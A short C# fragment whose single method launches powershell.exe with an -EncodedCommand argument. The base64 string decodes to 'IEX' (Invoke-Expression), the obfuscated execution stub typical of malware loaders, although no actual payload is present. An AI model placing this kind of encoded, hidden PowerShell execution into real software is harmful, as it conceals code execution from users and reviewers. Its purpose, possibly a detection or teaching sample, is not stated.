class T { void Go() {
  var p = new ProcessStartInfo();
  p.FileName = "powershell.exe";
  p.Arguments = "-EncodedCommand SQBFAFgA";
  Process.Start(p);
}}
